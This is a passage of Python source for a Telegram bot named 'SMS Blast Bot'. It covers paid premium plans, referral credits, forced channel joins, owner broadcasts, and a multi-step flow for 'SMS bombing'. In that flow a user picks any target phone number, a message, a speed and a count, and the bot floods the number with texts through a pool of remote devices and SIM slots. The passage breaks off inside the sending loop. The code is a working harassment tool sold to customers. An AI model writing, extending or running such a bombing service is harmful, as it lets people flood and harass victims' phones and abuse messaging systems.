    await state.clear()
    d = load()
    uid = cq.from_user.id
    plans = d.get("premium", {}).get("plans", DEFAULT_PREMIUM_PLANS)
    prem_until = int(d.get("users", {}).get(str(uid), {}).get("premium_until", 0))
    status_line = (
        f"{em(EMOJI_CHECK, '🟢')} Active till: <b>{fmt_time(prem_until)}</b>\n\n"
        if prem_until > int(time.time())
        else f"{em(EMOJI_WARNING, '⚪')} No active premium plan\n\n"
    )
    lines = [
        f"{em(EMOJI_CROWN, '💎')} <b>{sc('premium plans')}</b>\n",
        status_line,
    ]
    for p in plans:
        lines.append(f"{em(EMOJI_STAR, '•')} <b>{p['label']}</b> — <b>₹{p['price']}</b>")
    lines.append(f"\n<i>{em(EMOJI_GIFT, '⚙️')} Custom days / hours / months ke liye niche tap karein.</i>")
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=premium_plans_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("prem:buy:"))
async def user_prem_buy_plan(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    plan_id = cq.data.split("prem:buy:", 1)[1]
    plans = d.get("premium", {}).get("plans", DEFAULT_PREMIUM_PLANS)
    plan = next((p for p in plans if p["id"] == plan_id), None)
    if not plan:
        await cq.answer("❌ Plan not found!", show_alert=True)
        return

    user_name = cq.from_user.full_name or "User"
    username = f"@{cq.from_user.username}" if cq.from_user.username else "No Username"
    duration_label = plan["label"]
    price_str = f"₹{plan['price']}"

    await notify_owners_premium_request(cq.bot, uid, user_name, username, duration_label, price_str)
    log_activity(d, "premium_request", uid, f"{duration_label} ({price_str})")
    save(d)

    await cq.answer("✅ Owner ko notification bhej diya gaya hai!", show_alert=True)
    await cq.message.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Premium Request Sent!</b>\n\n"
        f"{em(EMOJI_CROWN, '⏳')} Selected Plan: <b>{duration_label}</b>\n"
        f"{em(EMOJI_MONEY, '💰')} Price: <b>{price_str}</b>\n\n"
        f"<i>Owner ko notify kar diya gaya hai ki aapko <b>{duration_label}</b> ka premium chahiye.</i>\n"
        f"Contact: {SUPER_ADMIN_NAME}",
        reply_markup=kb([(f"{sc('back')}", "user:premium")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "prem:custom:menu")
async def user_prem_custom_menu(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '⚙️')} <b>Custom Premium Duration</b>\n\n"
        f"Kitna time ka premium chahiye? Unit select karein (<b>Days</b> / <b>Hours</b> / <b>Months</b>):",
        reply_markup=custom_prem_unit_kb(),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("prem:custom:unit:"))
async def user_prem_custom_unit(cq: CallbackQuery, state: FSMContext):
    unit = cq.data.split("prem:custom:unit:", 1)[1]
    await state.update_data(custom_prem_unit=unit)
    await state.set_state(S.custom_prem_value)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '⚙️')} <b>Custom Premium — {unit.upper()}</b>\n\n"
        f"Kitne <b>{unit}</b> ka premium chahiye? Sirf number bhejein (e.g. <code>2</code>):",
        reply_markup=kb([(f"{sc('cancel')}", "prem:custom:menu")]),
        parse_mode="HTML",
    )

@R.message(S.custom_prem_value)
async def user_prem_custom_value(msg: Message, state: FSMContext):
    try:
        val = int(msg.text.strip())
        if val <= 0:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejein (e.g. 2):", parse_mode="HTML")
        return

    data = await state.get_data()
    unit = data.get("custom_prem_unit", "days")
    await state.clear()

    unit_word = unit if val != 1 else unit.rstrip("s")
    duration_label = f"{val} {unit_word}"
    uid = msg.from_user.id
    user_name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"

    d = load()
    await notify_owners_premium_request(msg.bot, uid, user_name, username, duration_label, "Custom Quote")
    log_activity(d, "custom_premium_request", uid, duration_label)
    save(d)

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Custom Premium Request Sent!</b>\n\n"
        f"{em(EMOJI_CROWN, '⏳')} Requested: <b>{duration_label}</b>\n\n"
        f"<i>Owner ke paas notification bhej diya gaya hai ki is user ko <b>{duration_label}</b> ka premium chahiye.</i>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:prem:give")
async def owner_prem_give_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.give_prem_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '💎')} <b>Give Premium</b>\n\n"
        f"{sc('step 1/2')}: Jis user ko premium dena hai uska <b>Telegram User ID</b> bhejein:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.give_prem_uid)
async def owner_prem_give_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        target_uid = int(msg.text.strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid numeric User ID bhejein:", parse_mode="HTML")
        return
    await state.update_data(give_prem_uid=target_uid)
    await state.set_state(S.give_prem_value)
    await msg.answer(
        f"{em(EMOJI_CROWN, '💎')} <b>{sc('step 2/2')} — Duration</b>\n\n"
        f"Kitne time ka premium dena hai? Format likhein:\n"
        f"• <code>1d</code> / <code>3d</code> / <code>7d</code> (days)\n"
        f"• <code>12h</code> / <code>24h</code> (hours)\n"
        f"• <code>1m</code> / <code>2m</code> (months)\n"
        f"• Ya sirf number (days mana jayega, e.g. <code>5</code>)",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.give_prem_value)
async def owner_prem_give_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    raw = msg.text.strip().lower()
    try:
        if raw.endswith("h"):
            num = int(raw[:-1].strip())
            sec = num * 3600
            label = f"{num} hour(s)"
        elif raw.endswith("m"):
            num = int(raw[:-1].strip())
            sec = num * 30 * 86400
            label = f"{num} month(s)"
        elif raw.endswith("d"):
            num = int(raw[:-1].strip())
            sec = num * 86400
            label = f"{num} day(s)"
        else:
            num = int(raw)
            sec = num * 86400
            label = f"{num} day(s)"
        if num <= 0:
            raise ValueError
    except Exception:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Invalid duration! Example: <code>1d</code>, <code>6h</code>, <code>1m</code>, ya <code>7</code>",
            parse_mode="HTML",
        )
        return

    data = await state.get_data()
    target_uid = int(data.get("give_prem_uid"))
    await state.clear()

    until_ts = grant_premium(target_uid, sec, d)
    log_activity(d, "grant_premium", msg.from_user.id, f"Gave {label} to {target_uid}")
    save(d)

    try:
        await msg.bot.send_message(
            target_uid,
            f"{em(EMOJI_CROWN, '💎')} <b>Premium Activated!</b>\n\n"
            f"{em(EMOJI_ROCKET, '⏳')} Duration: <b>{label}</b>\n"
            f"{em(EMOJI_CHECK, '📅')} Valid Till: <b>{fmt_time(until_ts)}</b>\n\n"
            f"/start karein aur features enjoy karein!",
            parse_mode="HTML",
        )
    except Exception:
        pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Premium Granted!</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} User ID: <code>{target_uid}</code>\n"
        f"{em(EMOJI_ROCKET, '⏳')} Duration: <b>{label}</b>\n"
        f"{em(EMOJI_CHECK, '📅')} Valid Till: <b>{fmt_time(until_ts)}</b>",
        reply_markup=owner_kb(load()),
        parse_mode="HTML",
    )

# ========== AUTO MESSAGE (5 MIN / 10 MIN + AUTO-DELETE OLD) ==========
@R.callback_query(F.data == "owner:automsg:menu")
async def owner_automsg_menu(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    am = d.get("auto_msg", {})
    status = f"{em(EMOJI_CHECK, '🟢')} RUNNING" if am.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} STOPPED"
    msg_preview = am.get("text") or "<i>Not Set</i>"
    interval_min = am.get("interval_minutes", 5)

    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>{sc('auto message broadcast')}</b>\n\n"
        f"{em(EMOJI_STAR, '📌')} Status   : {status}\n"
        f"{em(EMOJI_ROCKET, '⏱')} Interval : <b>Every {interval_min} minute(s)</b>\n"
        f"{em(EMOJI_GEAR, '🗑')} Auto-Del : <b>Old msg deleted before new msg</b>\n\n"
        f"<b>Message:</b>\n{msg_preview}",
        reply_markup=auto_msg_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:automsg:set_text")
async def owner_automsg_set_text_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_auto_msg_text)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Set Auto Message</b>\n\n"
        f"Woh message type karein jo har interval pe bot users mein chalega:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:automsg:menu")]),
        parse_mode="HTML",
    )

@R.message(S.set_auto_msg_text)
async def owner_automsg_set_text_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    txt = (msg.text or "").strip()
    if not txt:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Khali message nahi ho sakta, text bhejein:", parse_mode="HTML")
        return
    d.setdefault("auto_msg", {})["text"] = txt
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Auto Message Saved!</b>",
        reply_markup=auto_msg_kb(load()),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:automsg:interval:"))
async def owner_automsg_interval(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    val = cq.data.split("owner:automsg:interval:", 1)[1]
    if val == "custom":
        await state.set_state(S.set_auto_msg_custom_min)
        await cq.message.edit_text(
            f"{em(EMOJI_GEAR, '⚙️')} <b>Custom Interval (Minutes)</b>\n\n"
            f"Kitne minutes baad auto message chalana hai? Number bhejein (e.g. <code>5</code> ya <code>10</code>):",
            reply_markup=kb([(f"{sc('cancel')}", "owner:automsg:menu")]),
            parse_mode="HTML",
        )
        return
    mins = int(val)
    d.setdefault("auto_msg", {})["interval_minutes"] = mins
    save(d)
    await cq.answer(f"✅ Interval set to {mins} minutes!", show_alert=True)
    await owner_automsg_menu(cq, state)

@R.message(S.set_auto_msg_custom_min)
async def owner_automsg_custom_min_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        mins = int(msg.text.strip())
        if mins < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejein (e.g. 5):", parse_mode="HTML")
        return
    d.setdefault("auto_msg", {})["interval_minutes"] = mins
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Interval set to <b>{mins} minute(s)</b>.",
        reply_markup=auto_msg_kb(load()),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:automsg:start")
async def owner_automsg_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if not d.get("auto_msg", {}).get("text"):
        await cq.answer("❌ Pehle Set Auto Msg se message set karein!", show_alert=True)
        return
    d.setdefault("auto_msg", {})["enabled"] = True
    save(d)
    await cq.answer("🟢 Auto Message Started!", show_alert=True)
    await owner_automsg_menu(cq, state)

@R.callback_query(F.data == "owner:automsg:stop")
async def owner_automsg_stop(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d.setdefault("auto_msg", {})["enabled"] = False
    save(d)
    await cq.answer("🛑 Auto Message Stopped!", show_alert=True)
    await owner_automsg_menu(cq, state)

# ========== /START & DEEP LINK ==========
@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    if is_new:
        asyncio.create_task(
            send_channel_log(
                msg.bot,
                f"🆕 <b>NEW USER JOINED</b>\n\n👤 <b>Name:</b> {name}\n🆔 <b>User ID:</b> <code>{uid}</code>\n"
                f"🌐 <b>Username:</b> {username}\n📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>",
            )
        )
    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("REF") and not d["users"].get(str(uid), {}).get("referred_by"):
        success, _, referrer = process_referral(uid, code, d)
        if success and referrer:
            try:
                ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                await msg.bot.send_message(
                    referrer,
                    f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                    f"{em(EMOJI_MONEY, '💰')} Aapko +{d['settings']['ref_credits']} credits mile hain.",
                    parse_mode="HTML",
                )
            except Exception:
                pass
    save(d)
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(
            f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nPremium ya approval lein.",
            reply_markup=kb([("ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs", "user:premium")]),
            parse_mode="HTML",
        )
        return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)
    if is_new:
        asyncio.create_task(
            send_channel_log(
                msg.bot,
                f"🆕 <b>NEW USER JOINED</b>\n\n👤 <b>Name:</b> {name}\n🆔 <b>User ID:</b> <code>{uid}</code>\n"
                f"🌐 <b>Username:</b> {username}\n📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>",
            )
        )
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(
            f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nPremium ya approval lein.",
            reply_markup=kb([("ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs", "user:premium")]),
            parse_mode="HTML",
        )
        return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass
        return
    await cq.answer("✅ Verified!", show_alert=True)
    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

# ========== SMS BLAST FLOW & PROGRESS ENGINE ==========
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied! Premium ya approval lein.", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML",
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo:", parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS:
        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\nJo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML",
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\nSending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    speed_map = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)
    devices = get_cached_devices() or await get_all_online_devices(d)
    count = len(devices)
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d) and not has_active_premium(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b>\n"
    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\nKitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML",
    )

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    unlimited = is_admin(uid, d) or is_owner(uid, d) or has_active_premium(uid, d)
    if not unlimited:
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>",
                reply_markup=kb([(f"{sc('premium plans')}", "user:premium"), (f"{sc('home')}", "user:home")]),
                parse_mode="HTML",
            )
            return
        if count > current_credits:
            count = current_credits
    devices = get_cached_devices() or await get_all_online_devices(d)
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number.", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>", reply_markup=speed_kb("owner"), parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\nOnline APIs: <b>{len(devices)}</b>\nKitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:", parse_mode="HTML")
        return
    await state.clear()
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, fsmd["number"], fsmd["message"], count, devices, fsmd.get("send_speed", SPEED_DEFAULT))

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n{sc('step 1/4')} — {sc('number')}:", reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number.", parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS and not is_owner(msg.from_user.id, load()):
        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>", reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>", reply_markup=speed_kb("admin"), parse_mode="HTML")

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
    await state.update_data(send_speed=speed_map.get(cq.data, SPEED_MEDIUM))
    await state.set_state(S.admin_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    await cq.message.edit_text(f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\nOnline APIs: <b>{len(devices)}</b>\nKitne SMS bhejna hai?", reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:", parse_mode="HTML")
        return
    await state.clear()
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!", reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, fsmd["number"], fsmd["message"], count, devices, fsmd.get("send_speed", SPEED_DEFAULT))

async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing Started on {mask_number(number)}!</b>")
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old = USER_SESSIONS[uid]
            if old.task and not old.task.done():
                await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>", parse_mode="HTML")
                return
            del USER_SESSIONS[uid]
        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    d_init = load()
    unlimited = is_admin(uid, d_init) or is_owner(uid, d_init) or has_active_premium(uid, d_init)
    current_credits = get_user_credits(uid, d_init) if not unlimited else None
    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(progress_text(0, 0, count, current_credits, speed_label_display), reply_markup=stop_send_kb(), parse_mode="HTML")
    except Exception as e:
        log.error(f"Progress send failed: {e}")
        async with SESSIONS_LOCK:
            USER_SESSIONS.pop(uid, None)
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0:
                    break
                async with session.lock:
                    if session.cancelled:
                        break
                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sim_slots = [s.get("simSlotIndex", 0) for s in device["sims"]] if device["sims"] else [0]
                device_quota = min(3, msgs_left)
                device_sent = 0
                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled:
                            break
                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
                    async with session.lock:
